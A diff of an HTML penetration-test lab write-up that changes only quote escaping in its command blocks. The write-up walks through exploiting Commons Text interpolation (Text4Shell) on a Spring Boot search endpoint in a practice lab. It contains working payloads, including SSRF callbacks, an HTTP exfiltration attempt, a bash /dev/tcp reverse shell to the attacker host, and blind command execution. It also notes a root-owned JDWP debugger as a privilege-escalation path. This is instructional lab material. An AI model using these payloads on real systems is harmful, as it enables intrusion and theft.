@@ -443,7 +443,7 @@ SF:Total\x20Memory:\x2032440320\r\n\r\n")...</span></pre></div>
 </ul>
 <h3>1.4 Port 5000 by hand</h3>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;hello\n&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-w<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="m">192</span>.168.237.150<span class="w"> </span><span class="m">5000</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cat<span class="w"> </span>-v
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'hello\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-w<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="m">192</span>.168.237.150<span class="w"> </span><span class="m">5000</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cat<span class="w"> </span>-v
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Available Processors: 1^M
 Free Memory: 24814256^M
@@ -464,7 +464,7 @@ into. Noted and moved on.</p>
 <h3>1.5 The web service</h3>
 <p><strong>On Kali</strong></p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-i<span class="w"> </span>http://192.168.237.150:8080/
-curl<span class="w"> </span>-sS<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;http://192.168.237.150:8080/search?query=test&quot;</span>
+curl<span class="w"> </span>-sS<span class="w"> </span>-i<span class="w"> </span><span class="s2">"http://192.168.237.150:8080/search?query=test"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">HTTP/1.1 200 
 Content-Type: text/plain;charset=UTF-8
@@ -551,9 +551,9 @@ in-band test is therefore worthless.</p>
 <p>A quick loop over the paths worth trying on any Spring Boot target — actuator endpoints, Swagger,
 a versioned API, the error controller:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>u<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>api<span class="w"> </span>api/search<span class="w"> </span>search<span class="w"> </span>search/<span class="w"> </span>actuator<span class="w"> </span>health<span class="w"> </span>info<span class="w"> </span>swagger-ui/index.html<span class="w"> </span>v3/api-docs<span class="w"> </span>error<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%-22s &quot;</span><span class="w"> </span><span class="s2">&quot;/</span><span class="nv">$u</span><span class="s2">&quot;</span>
-<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;%{http_code} %{size_download}\n&#39;</span><span class="w"> </span>-m<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="s2">&quot;http://192.168.237.150:8080/</span><span class="nv">$u</span><span class="s2">&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>u<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span>api<span class="w"> </span>api/search<span class="w"> </span>search<span class="w"> </span>search/<span class="w"> </span>actuator<span class="w"> </span>health<span class="w"> </span>info<span class="w"> </span>swagger-ui/index.html<span class="w"> </span>v3/api-docs<span class="w"> </span>error<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s2">"%-22s "</span><span class="w"> </span><span class="s2">"/</span><span class="nv">$u</span><span class="s2">"</span>
+<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s1">'%{http_code} %{size_download}\n'</span><span class="w"> </span>-m<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="s2">"http://192.168.237.150:8080/</span><span class="nv">$u</span><span class="s2">"</span>
 <span class="k">done</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">/                      200 19
@@ -577,7 +577,7 @@ a versioned API, the error controller:</p>
 </ul>
 <p>Direct access to <code>/error</code> returns 500 rather than the usual 999-status whitelabel page:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">&quot;http://192.168.237.150:8080/error&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://192.168.237.150:8080/error"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">{"timestamp":"2026-11-16T01:47:05.883+0000","status":999,"error":"None","message":"No message available"}</span></pre></div>
 <p><code>status: 999</code> is Spring Boot's <code>ErrorController</code> default for a direct hit — confirms Spring Boot,
@@ -587,8 +587,8 @@ adds nothing exploitable.</p>
 echo:</p>
 <p><strong>On Kali</strong></p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>q<span class="w"> </span>query<span class="w"> </span>search<span class="w"> </span>term<span class="w"> </span>name<span class="w"> </span>s<span class="w"> </span>text<span class="w"> </span>input<span class="w"> </span>keyword<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%-8s -&gt; &quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span>
-<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-m<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="s2">&quot;http://192.168.237.150:8080/search?</span><span class="nv">$p</span><span class="s2">=zzMARKERzz&quot;</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s2">"%-8s -&gt; "</span><span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2">"</span>
+<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-m<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="s2">"http://192.168.237.150:8080/search?</span><span class="nv">$p</span><span class="s2">=zzMARKERzz"</span>
 <span class="w">  </span><span class="nb">echo</span>
 <span class="k">done</span>
 </pre></div>
@@ -611,7 +611,7 @@ keeping:</p>
 </ul>
 <h3>2.3 Response shape</h3>
 <p>Every request returns the same 200 with a two-field JSON object:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;http://192.168.237.150:8080/search?query=test&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-i<span class="w"> </span><span class="s2">"http://192.168.237.150:8080/search?query=test"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">HTTP/1.1 200 
 Content-Type: text/plain;charset=UTF-8
@@ -625,9 +625,9 @@ consumed by any evaluation.</p>
 <h3>2.4 In-band probes</h3>
 <p>The standard first round on a parameter that ends up in a template or expression language:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;${7*7}&#39;</span><span class="w"> </span><span class="s1">&#39;#{7*7}&#39;</span><span class="w"> </span><span class="s1">&#39;${sys:java.version}&#39;</span><span class="w"> </span><span class="s1">&#39;${env:PATH}&#39;</span><span class="w"> </span><span class="s1">&#39;${date:yyyy-MM-dd}&#39;</span><span class="w"> </span><span class="s1">&#39;{{7*7}}&#39;</span><span class="w"> </span><span class="s2">&quot;a&#39; OR &#39;1&#39;=&#39;1&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;%-22s =&gt; &#39;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span>
-<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-m<span class="w"> </span><span class="m">8</span><span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;query=</span><span class="nv">$p</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;http://192.168.237.150:8080/search&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">'${7*7}'</span><span class="w"> </span><span class="s1">'#{7*7}'</span><span class="w"> </span><span class="s1">'${sys:java.version}'</span><span class="w"> </span><span class="s1">'${env:PATH}'</span><span class="w"> </span><span class="s1">'${date:yyyy-MM-dd}'</span><span class="w"> </span><span class="s1">'{{7*7}}'</span><span class="w"> </span><span class="s2">"a' OR '1'='1"</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'%-22s =&gt; '</span><span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2">"</span>
+<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-m<span class="w"> </span><span class="m">8</span><span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s2">"query=</span><span class="nv">$p</span><span class="s2">"</span><span class="w"> </span><span class="s2">"http://192.168.237.150:8080/search"</span>
 <span class="w">  </span><span class="nb">echo</span>
 <span class="k">done</span>
 </pre></div>
@@ -804,32 +804,32 @@ records request lines <strong>and</strong> headers:</p>
 <p><strong>On Kali</strong></p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>~/t4s<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>~/t4s
 
-cat<span class="w"> </span>&gt;<span class="w"> </span>cap_server.py<span class="w"> </span><span class="s">&lt;&lt;&#39;EOS&#39;</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>cap_server.py<span class="w"> </span><span class="s">&lt;&lt;'EOS'</span>
 <span class="s">#!/usr/bin/env python3</span>
-<span class="s">&quot;&quot;&quot;Minimal raw HTTP capture server: logs each request line + headers to a file.&quot;&quot;&quot;</span>
+<span class="s">"""Minimal raw HTTP capture server: logs each request line + headers to a file."""</span>
 <span class="s">import datetime</span>
 <span class="s">import socketserver</span>
 <span class="s">import sys</span>
 
-<span class="s">LOG = &quot;callback_capture.log&quot;</span>
+<span class="s">LOG = "callback_capture.log"</span>
 
 
 <span class="s">class Handler(socketserver.StreamRequestHandler):</span>
 <span class="s">    def handle(self):</span>
-<span class="s">        line = self.rfile.readline().decode(&quot;latin-1&quot;).strip()</span>
+<span class="s">        line = self.rfile.readline().decode("latin-1").strip()</span>
 <span class="s">        headers = []</span>
 <span class="s">        while True:</span>
-<span class="s">            h = self.rfile.readline().decode(&quot;latin-1&quot;).strip()</span>
+<span class="s">            h = self.rfile.readline().decode("latin-1").strip()</span>
 <span class="s">            if not h:</span>
 <span class="s">                break</span>
 <span class="s">            headers.append(h)</span>
-<span class="s">        ts = datetime.datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)</span>
-<span class="s">        with open(LOG, &quot;a&quot;) as fh:</span>
-<span class="s">            fh.write(f&quot;[{ts}] {self.client_address[0]}:{self.client_address[1]} {line}\n&quot;)</span>
+<span class="s">        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")</span>
+<span class="s">        with open(LOG, "a") as fh:</span>
+<span class="s">            fh.write(f"[{ts}] {self.client_address[0]}:{self.client_address[1]} {line}\n")</span>
 <span class="s">            for h in headers:</span>
-<span class="s">                fh.write(f&quot;[{ts}]   {h}\n&quot;)</span>
-<span class="s">        body = b&quot;ok\n&quot;</span>
-<span class="s">        self.wfile.write(b&quot;HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n&quot; % len(body))</span>
+<span class="s">                fh.write(f"[{ts}]   {h}\n")</span>
+<span class="s">        body = b"ok\n"</span>
+<span class="s">        self.wfile.write(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(body))</span>
 <span class="s">        self.wfile.write(body)</span>
 
 
@@ -837,10 +837,10 @@ cat<span class="w"> </span>&gt;<span class="w"> </span>cap_server.py<span class=
 <span class="s">    allow_reuse_address = True</span>
 
 
-<span class="s">if __name__ == &quot;__main__&quot;:</span>
+<span class="s">if __name__ == "__main__":</span>
 <span class="s">    port = int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8899</span>
-<span class="s">    with Server((&quot;0.0.0.0&quot;, port), Handler) as srv:</span>
-<span class="s">        print(f&quot;capture server on {port}&quot;, flush=True)</span>
+<span class="s">    with Server(("0.0.0.0", port), Handler) as srv:</span>
+<span class="s">        print(f"capture server on {port}", flush=True)</span>
 <span class="s">        srv.serve_forever()</span>
 <span class="s">EOS</span>
 
@@ -850,8 +850,8 @@ python3<span class="w"> </span>-u<span class="w"> </span>cap_server.py<span clas
 <p>Leave it running. Everything below arrives in this terminal, not in the curl output.</p>
 <h3>3.3 Oracle 1 — SSRF proves interpolation</h3>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">&#39;query=${url:UTF-8:http://192.168.45.158:8899/ssrf-proof}&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="s2">&quot;http://192.168.237.150:8080/search&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">'query=${url:UTF-8:http://192.168.45.158:8899/ssrf-proof}'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">"http://192.168.237.150:8080/search"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">{"query":"${url:UTF-8:http://192.168.45.158:8899/ssrf-proof}","result":""}</span></pre></div>
 <p>The response is, once again, nothing. But the listener terminal shows:</p>
@@ -878,11 +878,11 @@ needs no network, works even if egress is filtered, and produces a signal that c
 with anything else: wall-clock time.</p>
 <p>Baseline and payload, measured the same way:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;baseline123&#39;</span><span class="w"> </span><span class="s1">&#39;${script:javascript:java.lang.Thread.sleep(4000)}&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">'baseline123'</span><span class="w"> </span><span class="s1">'${script:javascript:java.lang.Thread.sleep(4000)}'</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
 <span class="w">  </span><span class="nv">S</span><span class="o">=</span><span class="k">$(</span>date<span class="w"> </span>+%s%N<span class="k">)</span>
-<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-m<span class="w"> </span><span class="m">30</span><span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;query=</span><span class="nv">$p</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;http://192.168.237.150:8080/search&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null
+<span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-m<span class="w"> </span><span class="m">30</span><span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s2">"query=</span><span class="nv">$p</span><span class="s2">"</span><span class="w"> </span><span class="s2">"http://192.168.237.150:8080/search"</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null
 <span class="w">  </span><span class="nv">E</span><span class="o">=</span><span class="k">$(</span>date<span class="w"> </span>+%s%N<span class="k">)</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;payload=</span><span class="nv">$p</span><span class="s2"> elapsed_ms=</span><span class="k">$((</span><span class="w"> </span><span class="o">(</span><span class="nv">E</span><span class="o">-</span><span class="nv">S</span><span class="o">)/</span><span class="m">1000000</span><span class="w"> </span><span class="k">))</span><span class="s2">&quot;</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"payload=</span><span class="nv">$p</span><span class="s2"> elapsed_ms=</span><span class="k">$((</span><span class="w"> </span><span class="o">(</span><span class="nv">E</span><span class="o">-</span><span class="nv">S</span><span class="o">)/</span><span class="m">1000000</span><span class="w"> </span><span class="k">))</span><span class="s2">"</span>
 <span class="k">done</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">payload=baseline123 elapsed_ms=142
@@ -910,12 +910,12 @@ do not parallelise them — a handful of 4-second probes is plenty, and hammerin
 <p>Worth recording, because it looks like it should work and cost time. The obvious next step is to
 exfiltrate command output over HTTP from inside the <code>script</code> block:</p>
 <p><strong>On Kali</strong> (did not produce a callback)</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">&#39;query=${script:javascript:var p=java.lang.Runtime.getRuntime().exec(&quot;id&quot;);var s=new java.util.Scanner(p.getInputStream()).useDelimiter(&quot;\\A&quot;).next();new java.net.URL(&quot;http://192.168.45.158:8899/exfil?d=&quot;+java.net.URLEncoder.encode(s,&quot;UTF-8&quot;)).openStream().close();}&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="s2">&quot;http://192.168.237.150:8080/search&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">'query=${script:javascript:var p=java.lang.Runtime.getRuntime().exec("id");var s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\A").next();new java.net.URL("http://192.168.45.158:8899/exfil?d="+java.net.URLEncoder.encode(s,"UTF-8")).openStream().close();}'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">"http://192.168.237.150:8080/search"</span>
 </pre></div>
 <p>Also tried, also silent:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">&#39;query=${script:javascript:new java.net.URL(&quot;http://192.168.45.158:8899/jsNet&quot;).openStream().close();}&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="s2">&quot;http://192.168.237.150:8080/search&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">'query=${script:javascript:new java.net.URL("http://192.168.45.158:8899/jsNet").openStream().close();}'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">"http://192.168.237.150:8080/search"</span>
 </pre></div>
 <p>No callback ever arrived for a <code>java.net.URL</code> opened <strong>from inside the script block</strong>, while the
 <code>${url:}</code> lookup (same JVM, same network path, executed by Commons Text's own code) worked every
@@ -974,8 +974,8 @@ Ncat: Listening on 0.0.0.0:4445</span></pre></div>
    the Java string, not of a shell command line, because there is no shell yet.</li>
 </ol>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">&#39;query=${script:javascript:new java.lang.ProcessBuilder(&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.45.158/4445 0&gt;&amp;1&quot;).start();}&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="s2">&quot;http://192.168.237.150:8080/search&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">'query=${script:javascript:new java.lang.ProcessBuilder("/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/192.168.45.158/4445 0&gt;&amp;1").start();}'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">"http://192.168.237.150:8080/search"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">{"query":"${script:javascript:new java.lang.ProcessBuilder(\"/bin/bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/192.168.45.158/4445 0&gt;&amp;1\").start();}","result":""}</span></pre></div>
 <p>Still a 200 with an empty <code>result</code> — the handler has no idea anything happened. The listener does:</p>
@@ -988,7 +988,7 @@ us, so the shell is a child of the vulnerable application. That is confirmed dir
 <h3>4.3 Identify the shell and upgrade the TTY</h3>
 <p><strong>On the target</strong></p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname
-ps<span class="w"> </span>-eo<span class="w"> </span>user,pid,args<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;[j]ava&#39;</span>
+ps<span class="w"> </span>-eo<span class="w"> </span>user,pid,args<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">'[j]ava'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">uid=1001(dev) gid=1001(dev) groups=1001(dev)
 lab-pwk2-student-cl5-150-ubuntu20-berlin-241-187
@@ -997,7 +997,7 @@ dev          680 java -jar /opt/dev/api.jar</span></pre></div>
 running as the same user. The RCE runs as the application, as expected.</p>
 <p>The session is a dumb pipe: no job control, no <code>sudo</code> prompts, no <code>vi</code>. Upgrade it:</p>
 <p><strong>On the target</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
 </pre></div>
 <p>then, hitting <code>Ctrl-Z</code> to background it:</p>
 <p><strong>On Kali</strong> (in the same ncat terminal)</p>
@@ -1032,15 +1032,15 @@ sessions. The box has been cleaned.</p>
 <p>Sometimes a callback is impossible (no egress, or you only need one command). The same vulnerability
 executes a single command and blocks until it finishes:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">&#39;query=${script:javascript:java.lang.Runtime.getRuntime().exec(&quot;bash -c id&gt;/tmp/out&quot;).waitFor();}&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="s2">&quot;http://192.168.237.150:8080/search&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">'query=${script:javascript:java.lang.Runtime.getRuntime().exec("bash -c id&gt;/tmp/out").waitFor();}'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">"http://192.168.237.150:8080/search"</span>
 </pre></div>
 <p>The command must contain <strong>no spaces</strong>, because <code>exec(String)</code> splits on them. If you need
 separators, use <code>${IFS}</code> — inside the URL-encoded parameter the shell never sees it, but the JVM
 passes the literal string to <code>bash -c</code>, and <code>bash</code> expands it:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">&#39;query=${script:javascript:java.lang.Runtime.getRuntime().exec(&quot;bash -c cat${IFS}/root/proof.txt&gt;/tmp/out&quot;).waitFor();}&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="s2">&quot;http://192.168.237.150:8080/search&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-sS<span class="w"> </span>-G<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s1">'query=${script:javascript:java.lang.Runtime.getRuntime().exec("bash -c cat${IFS}/root/proof.txt&gt;/tmp/out").waitFor();}'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">"http://192.168.237.150:8080/search"</span>
 </pre></div>
 <p>That particular one fails as <code>dev</code> (the file is root-only) — it is here to show the syntax, not the
 result. <code>.waitFor()</code> keeps the substitution running until the process exits, so a short command
@@ -1107,7 +1107,7 @@ javac 18.0.2-ea</span></pre></div>
 <h3>5.2 Processes and listeners</h3>
 <p>This is the command that ends the box:</p>
 <p><strong>On the target</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ps<span class="w"> </span>-eo<span class="w"> </span>user,pid,args<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;[j]ava&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ps<span class="w"> </span>-eo<span class="w"> </span>user,pid,args<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">'[j]ava'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">dev          680 java -jar /opt/dev/api.jar
 root         698 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java</span></pre></div>
@@ -1116,7 +1116,7 @@ no authentication — anything that can open a TCP connection to that port is a 
 debugger can invoke arbitrary methods in the JVM. As root.</p>
 <p>The listener inventory confirms it is loopback-only:</p>
 <p><strong>On the target</strong></p>
